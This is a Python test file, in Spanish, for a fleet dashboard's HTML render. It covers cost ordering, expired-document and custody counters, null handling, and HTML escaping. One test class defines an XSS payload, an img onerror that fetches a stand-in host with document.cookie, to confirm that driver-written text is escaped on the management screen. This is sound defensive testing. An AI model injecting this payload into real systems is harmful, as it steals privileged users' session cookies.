        """El defecto principal que previene el canon §6, en su forma de UI.

        `TGZ653` tiene `hubo_gastos: False`. Metido en el orden con sus `$0`
        saldría último, o sea **coronado como el camión más barato de la
        flota** — la lectura exacta que el canon existe para impedir. Va en su
        propio grupo y el grupo dice por qué.
        """
        html = _correr(tmp_path, _lleno())['html']
        i = html.index('tabla-titulo">Pesos por mes · ¿qué camión')
        bloque = html[i:i + 3000]
        assert 'Sin registro' in bloque
        assert bloque.index('THP696') < bloque.index('Sin registro'), \
            'el que tiene plata registrada tiene que ir en el orden'
        assert bloque.index('Sin registro') < bloque.index('TGZ653'), \
            'TGZ653 no tiene un solo gasto: no puede aparecer en el orden'

    def test_el_total_declara_a_cuantos_vehiculos_cubre(self, tmp_path):
        """Un total sobre 1 de 2 que no lo dice es el número que alguien lleva a
        una reunión creyendo que es la flota entera."""
        html = _correr(tmp_path, _lleno())['html']
        bloque = html[html.index('tabla-titulo">Pesos por mes · ¿qué camión'):][:3000]
        assert 'sobre 1 de 2' in bloque
        assert 'NO incluye 1 sin registro' in bloque

    def test_un_cero_MEDIDO_se_distingue_de_un_sin_registro(self, tmp_path):
        """Los dos ceros del canon §6. `hubo_gastos: True` con `pesos: 0` es una
        afirmación sobre la flota —hay facturas y ninguna cayó en el mes—; con
        `False` no se sabe nada. Se ven idénticos en un `$0` pelado."""
        d = _lleno()
        d['cpk_mes'] = [dict(d['cpk_mes'][0], placa='WHX245', pesos='0.00',
                             hubo_gastos=True)]
        bloque = _correr(tmp_path, d)['html']
        bloque = bloque[bloque.index('tabla-titulo">Pesos por mes · ¿qué camión'):][:3000]
        assert 'ningún gasto cayó en el mes' in bloque
        assert 'Sin registro' not in bloque, \
            'tiene gastos registrados: el cero es medido, no una ausencia'

    def test_sin_UN_SOLO_gasto_el_panel_no_publica_un_cero(self, tmp_path):
        """Con la base de hoy —cero gastos en toda la flota— un «Total: $0» se
        lee como una flota que no cuesta nada. El panel vacío dice el gesto."""
        d = _lleno()
        d['cpk_mes'] = [dict(f, pesos='0.00', hubo_gastos=False)
                        for f in d['cpk_mes']]
        bloque = _correr(tmp_path, d)['html']
        bloque = bloque[bloque.index('tabla-titulo">Pesos por mes'):][:1200]
        assert 'Esperando el primer registro' in bloque
        assert 'Se enciende:' in bloque
        assert 'Total' not in bloque, 'publicó un total sobre cero registros'

    def test_el_orden_es_de_mayor_a_menor_y_no_por_placa(self, tmp_path):
        """Lo contrario que el panel de rendimiento, que va por placa a
        propósito para no ser un ranking. Acá el ranking **es** la pregunta."""
        d = _lleno()
        base = d['cpk_mes'][0]
        d['cpk_mes'] = [dict(base, placa='AAA111', pesos='100.00', hubo_gastos=True),
                        dict(base, placa='ZZZ999', pesos='900.00', hubo_gastos=True)]
        bloque = _correr(tmp_path, d)['html']
        bloque = bloque[bloque.index('tabla-titulo">Pesos por mes · ¿qué camión'):][:3000]
        assert bloque.index('ZZZ999') < bloque.index('AAA111')


class TestLosContadoresDicenAQuienLlamar:
    """Papeles y Custodia eran cifras sin placa, y son **dos de las cinco
    señales con las que se mide a control de flota**.

    «2 documentos vencidos» no es accionable y su ficha describe el trabajo como
    *«persigue lo vencido»*: para saber a cuál, había que abrir los seis
    expedientes. Es el criterio 1 de este archivo —«ninguna cifra sin su
    enumeración al lado»— incumplido justo donde más se nota.
    """

    def test_papeles_nombra_la_placa_y_el_documento(self, tmp_path):
        html = _correr(tmp_path, _lleno())['html']
        bloque = html[html.index('tabla-titulo">Papeles<'):][:2500]
        assert 'THP696' in bloque and 'soat' in bloque
        assert 'venció hace 15 día(s)' in bloque

    def test_el_signo_separa_sacar_la_cita_de_bajar_el_camion(self, tmp_path):
        """Los dos se atienden distinto y se leen en el mismo renglón. Un
        «faltan 16 días» y un «venció hace 15» con el mismo formato producen la
        misma reacción, que es la equivocada para uno de los dos."""
        bloque = _correr(tmp_path, _lleno())['html']
        bloque = bloque[bloque.index('tabla-titulo">Papeles<'):][:2500]
        assert 'vence en 16 día(s)' in bloque
        assert 'venció hace' in bloque

    def test_el_papel_sin_cargar_no_finge_una_fecha(self, tmp_path):
        """`vence: None` no es «vence hoy» ni «no vence»: es que no hay fecha
        que juzgar. La base lo impone —un `no_encontrado` no puede llevar
        vencimiento— y la pantalla no puede contradecirla."""
        bloque = _correr(tmp_path, _lleno())['html']
        bloque = bloque[bloque.index('tabla-titulo">Papeles<'):][:2500]
        assert 'poliza_rc — nadie lo ha podido mostrar' in bloque
        assert 'NaN' not in bloque and 'null' not in bloque

    def test_custodia_dice_placa_dia_y_QUE_mitad_falta(self, tmp_path):
        """«Faltan las de inicio» y «faltan las de cierre» se arreglan hablando
        con personas distintas y en momentos distintos del día."""
        bloque = _correr(tmp_path, _lleno())['html']
        bloque = bloque[bloque.index('tabla-titulo">Custodia<'):][:2500]
        assert 'THP696' in bloque and '2026-09-01' in bloque
        assert 'faltan fotos de fin (2 de 11)' in bloque
        assert 'faltan fotos de inicio (7 de 13)' in bloque

    def test_el_cierre_forzado_publica_su_motivo(self, tmp_path):
        """Un forzado sin motivo sería un cierre anónimo. La base lo prohíbe con
        un CHECK; la pantalla lo muestra, que es lo que lo hace útil."""
        bloque = _correr(tmp_path, _lleno())['html']
        bloque = bloque[bloque.index('tabla-titulo">Custodia<'):][:2500]
        assert 'el conductor no volvió a la sede' in bloque

    def test_sin_nada_pendiente_lo_DICE_en_vez_de_dejar_un_hueco(self, tmp_path):
        """La lista vacía no es un `return ''`. Un panel con tres ceros y nada
        debajo es indistinguible de uno cuya enumeración se rompió."""
        d = _lleno()
        d.update(documentos_por_vehiculo=[], custodias_por_vehiculo=[])
        html = _correr(tmp_path, d)['html']
        assert 'Ningún documento vencido' in html
        assert 'Ningún turno cerrado a la fuerza' in html

    def test_sin_la_tabla_no_repite_lo_que_el_panel_ya_dijo(self, tmp_path):
        """`null` es «la tabla no existe», y el panel entero ya lo declaró
        arriba con su gesto. Decirlo dos veces con otras palabras es cómo un
        renglón deja de leerse."""
        html = _correr(tmp_path, {})['html']
        assert 'Ningún documento vencido' not in html
        assert 'La tabla de documentos todavía no existe' in html


class TestElRecorridoDeLaSemana:
    """El índice que existe porque el orden de los paneles es de dependencia.

    Cuatro de las cinco señales del rol viven en los paneles 11, 13 y 14 de 15 —
    arriba está lo que todavía no se puede medir. El orden de abajo no está mal
    y no se toca: es un orden para quien construye. Este bloque es el de quien
    opera, y es lo único del tab que se lee de arriba a abajo en 30 segundos.
    """

    def test_las_cinco_senales_estan_y_nombran_su_panel(self, tmp_path):
        html = _correr(tmp_path, _lleno())['html']
        bloque = html[html.index('El recorrido de la semana'):][:2200]
        for señal in ('Fichas técnicas sin completar',
                      'Daños que pasaron su fecha límite',
                      'Documentos vencidos', 'Turnos cerrados a la fuerza',
                      'Custodias sin las fotos completas'):
            assert señal in bloque, señal
        for panel in ('Lo que la ficha no dice', 'Días de hallazgo abierto',
                      'Papeles', 'Custodia'):
            assert panel in bloque, f'no dice dónde vive: {panel}'

    def test_va_ARRIBA_de_los_paneles_que_indexa(self, tmp_path):
        """Un índice después del contenido no es un índice."""
        html = _correr(tmp_path, _lleno())['html']
        assert (html.index('El recorrido de la semana')
                < html.index('tabla-titulo">Papeles<'))
        assert (html.index('El recorrido de la semana')
                < html.index('Días de hallazgo abierto'))

    def test_el_numero_del_indice_ES_el_del_panel(self, tmp_path):
        """La objeción obvia al índice: dos sitios que dicen el mismo número
        terminan diciendo dos. Acá no pueden — los dos leen el mismo `h` en el
        mismo render— y va probado, porque es la propiedad que lo hace legítimo.
        """
        d = _lleno()
        d['documentos_vencidos'] = 7
        html = _correr(tmp_path, d)['html']
        indice = html[html.index('El recorrido de la semana'):][:2200]
        panel = html[html.index('tabla-titulo">Papeles<'):][:2500]
        assert '>7<' in indice and '>7<' in panel

    def test_las_fichas_van_al_REVES_y_el_color_no_miente(self, tmp_path):
        """`fichas_completas` crece cuando el trabajo avanza; las otras cuatro
        crecen cuando empeora. Publicar «4» en rojo junto a «1 documento
        vencido» en rojo diría que las dos son malas noticias."""
        d = _lleno()
        d['cobertura_por_vehiculo'] = [
            dict(f, ficha_completa=True) for f in d['cobertura_por_vehiculo']]
        bloque = _correr(tmp_path, d)['html']
        bloque = bloque[bloque.index('El recorrido de la semana'):][:2200]
        i = bloque.index('Fichas técnicas sin completar')
        assert 'var(--red)' not in bloque[i:i + 400], (
            'con todas las fichas completas no falta ninguna: no puede ir en rojo')

    def test_las_fichas_NO_salen_de_restar_dos_denominadores(self, tmp_path):
        """El defecto que tuvo este renglón durante su primera versión.

        Se calculaba `vehiculos_activos - fichas_completas`. Los dos números
        existen y el health los publica, pero **no comparten denominador**:
        `fichas_completas` cuenta fichas completas de TODOS los vehículos y
        `vehiculos_activos` solo los activos. Un vehículo dado de baja con su
        ficha completa hacía la resta negativa, y el índice publicaba
        «-1 fichas técnicas sin completar».

        Se cuenta de `cobertura_por_vehiculo`, que es la misma lista que pinta
        el panel al que este renglón manda. Una fuente, no dos.
        """
        d = _lleno()
        # El escenario exacto: dos activos, y el health reportando más fichas
        # completas que vehículos activos.
        d['cobertura_por_vehiculo'] = [
            dict(d['cobertura_por_vehiculo'][0], placa='AAA111', ficha_completa=True),
            dict(d['cobertura_por_vehiculo'][0], placa='BBB222', ficha_completa=True),
        ]
        d.update(vehiculos_activos=2, fichas_completas=5)
        bloque = _correr(tmp_path, d)['html']
        bloque = bloque[bloque.index('El recorrido de la semana'):][:2200]
        i = bloque.index('Fichas técnicas sin completar')
        renglon = bloque[i:i + 400]
        assert '>-' not in renglon, f'publicó un negativo: {renglon[:200]}'
        assert '>0<' in renglon, 'las dos activas tienen ficha completa'

    def test_los_danos_vencidos_salen_del_campo_y_no_de_un_recuento(self, tmp_path):
        """`dias_hallazgo_abierto.n_vencidos` lo calcula el dominio sobre los
        hallazgos que ENTRAN al indicador. Recontarlo en el cliente filtrando
        `casos` daba el mismo número solo porque los casos que no entran no
        traen la clave `vencido` — un acuerdo tácito con el serializador.

        Se afirma leyendo el campo: si el índice recontara, un `n_vencidos`
        distinto de la suma de banderas lo delataría.
        """
        d = _lleno()
        dhc = dict(d['dias_hallazgo_abierto'])
        dhc['n_vencidos'] = 9
        d['dias_hallazgo_abierto'] = dhc
        bloque = _correr(tmp_path, d)['html']
        bloque = bloque[bloque.index('El recorrido de la semana'):][:2200]
        i = bloque.index('Daños que pasaron su fecha límite')
        assert '>9<' in bloque[i:i + 400]

    def test_un_null_dice_sin_dato_y_NO_cero(self, tmp_path):
        """«No se pudo mirar» y «no hay nada» autorizan cosas distintas: el
        segundo permite no hacer nada, el primero no."""
        bloque = _correr(tmp_path, {})['html']
        bloque = bloque[bloque.index('El recorrido de la semana'):][:2200]
        assert bloque.count('sin dato') == 5, 'con la base vacía las cinco lo son'
        assert '>0<' not in bloque

    def test_le_dice_a_gestion_que_esta_no_es_su_pantalla(self, tmp_path):
        """Cuatro roles ven este tab y solo dos tienen decisión asignada. Un rol
        que abre un tablero, no encuentra nada que decidir y nadie le dijo que
        era así, deja de abrirlo — y arrastra al tablero
        (`gestion-gerente.md:29`)."""
        html = _correr(tmp_path, _lleno())['html']
        bloque = html[html.index('El recorrido de la semana'):][:2500]
        assert 'Pesos por mes' in bloque and 'Costo por kilómetro' in bloque


class TestNingunPanelPublicaBasuraConAutoridad:
    """`test_con_datos_no_pinta_NaN_ni_undefined` corre sobre `_lleno()`, donde
    todos los campos están poblados, y `_correr(tmp_path, {})` corta en el guard
    de tabla ausente. Entre esos dos mundos queda el que nadie probaba: **el
    campo estructurado en `null` mientras sus contadores hermanos traen número.**

    Ahí `flotaAnInspeccion` hacía `h.segundos_llenado_30d || {}` y publicaba
    «Mediana de llenado: undefineds sobre undefined inspección(es)».

    No era alcanzable —los dos campos guardan la misma tabla y el guard de
    arriba cortaba—, pero eso es una coincidencia entre dos campos, no un
    invariante. Este test la vuelve una afirmación.
    """

    #: Los campos estructurados que un panel podría recibir en `null` mientras
    #: el resto del payload trae números.
    ESTRUCTURADOS = ['segundos_llenado_30d', 'dias_hallazgo_abierto', 'cpk_mes',
                     'lecturas_por_vehiculo', 'cobertura_por_vehiculo',
                     'rendimiento_por_vehiculo', 'km_dia_por_vehiculo',
                     'km_por_posicion', 'documentos_por_vehiculo',
                     'custodias_por_vehiculo']

    @pytest.mark.parametrize('campo', ESTRUCTURADOS)
    def test_un_campo_estructurado_en_null_no_pinta_undefined(self, tmp_path,
                                                              campo):
        d = _lleno()
        d[campo] = None
        html = _correr(tmp_path, d)['html']
        for basura in ('undefined', 'NaN', '[object Object]'):
            assert basura not in html, (
                f'con {campo}=null el tablero pintó {basura!r} — un hueco se '
                f'lee como hueco, pero esto se lee como dato')


class TestElTextoDelConductorNoEjecutaNadaEnLaPantallaDeGestion:
    """El camino de escalada, cerrado y probado ejecutando el render.

    `POST /flota/custodia/traspaso` es `LECTURA_FLOTA`: **el conductor escribe**
    el motivo de un cierre forzado. Ese texto lo pinta el panel de Custodia, que
    solo ven gestión y control de flota. Es el rol con menos permisos del módulo
    escribiendo en la sesión de los que más tienen.

    Se prueba con `esc()` **de verdad** —el arnés carga `util.js`, no lo
    stubbea— y mirando el DOM resultante, no grepeando el fuente. Un
    `flotaAnTextoCustodia` que dejara de llamar a `esc` seguiría nombrando el
    campo y pasaría cualquier test de texto.
    """

    CARGA = '<img src=x onerror="fetch(\'//malo?c=\'+document.cookie)">'

    def _con_motivo(self, tmp_path, motivo):
        d = _lleno()
        d['custodias_por_vehiculo'] = [{
            'placa': 'THP696', 'custodia_id': 4,
            'inicio_ts': '2026-09-01T05:10:00', 'fin_ts': '2026-09-01T18:20:00',
            'abierta': False, 'cierre_forzado': True,
            'cierre_forzado_motivo': motivo, 'sin_foto_completa': False,
            'mitad_incompleta': None, 'fotos': None, 'fotos_exigidas': None,
            'base': 'custodias registradas contra el vehículo',
            'etiqueta': 'toda la historia registrada'}]
        return _correr(tmp_path, d)['html']

    def test_el_markup_inyectado_no_llega_vivo_al_DOM(self, tmp_path):
        html = self._con_motivo(tmp_path, self.CARGA)
        assert '<img src=x onerror' not in html, (
            'el motivo del conductor llegó como marcado ejecutable a la '
            'pantalla de gestión')

    def test_pero_el_texto_SI_se_ve(self, tmp_path):
        """Escapar no es esconder. El motivo es la información: quien mira el
        tablero necesita leer qué escribió el conductor, aunque sea basura —
        sobre todo si es basura."""
        html = self._con_motivo(tmp_path, self.CARGA)
        assert '&lt;img src=x onerror' in html

    def test_un_motivo_normal_se_lee_igual_que_antes(self, tmp_path):
        """La otra dirección: un escapado que rompa el texto corriente hace que
        alguien lo quite en seis meses «porque se ve mal»."""
        html = self._con_motivo(tmp_path, 'el conductor no volvió a la sede')
        assert 'el conductor no volvió a la sede' in html

    def test_las_comillas_no_rompen_el_atributo_que_las_rodea(self, tmp_path):
        html = self._con_motivo(tmp_path, 'dijo "ya voy" y no volvió')
        assert '&quot;ya voy&quot;' in html
        assert '"ya voy"' not in html


class TestEscConvierteYNoDecide:
    """`esc()` a solas. Va acá y no en un archivo aparte porque este arnés ya
    carga `util.js` de verdad."""

    def _esc(self, tmp_path, valor):
        """Corre el `esc` real y devuelve lo que produce."""
        d = _lleno()
        d['custodias_por_vehiculo'] = [{
            'placa': valor, 'custodia_id': 1, 'inicio_ts': None, 'fin_ts': None,
            'abierta': True, 'cierre_forzado': True,
            'cierre_forzado_motivo': 'x', 'sin_foto_completa': False,
            'mitad_incompleta': None, 'fotos': None, 'fotos_exigidas': None,
            'base': 'b', 'etiqueta': 'e'}]
        return _correr(tmp_path, d)['html']

    def test_escapa_los_cinco_caracteres(self, tmp_path):
        html = self._esc(tmp_path, '<&>"\'')
        assert '&lt;&amp;&gt;&quot;&#39;' in html

    def test_un_null_sigue_viendose_null_y_no_vacio(self, tmp_path):
        """`String(v)` y no un default a `\'\'`: reproduce lo que hacía el
        literal de plantilla, para que el cambio mueva UNA cosa. Convertir los
        nulos en vacío es una decisión de producto distinta, y en este repo
        esconder un hueco tiene historial."""
        html = self._esc(tmp_path, None)
        assert '<b>null</b>' in html
